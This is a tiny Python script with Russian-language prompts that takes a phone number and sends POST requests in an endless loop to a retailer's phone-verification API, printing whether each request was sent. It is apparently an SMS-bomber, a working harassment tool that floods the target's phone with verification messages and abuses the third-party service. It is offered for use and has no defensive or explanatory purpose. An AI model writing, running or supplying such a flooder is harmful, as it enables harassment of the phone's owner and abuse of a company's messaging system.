import requests

phone = input("Номер (в формате 7ХХХХХХХХХХ)->")
phone9 = phone[1:]

while True:
    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
        print('Отправлено')
    except:
        print('Не отправлено')
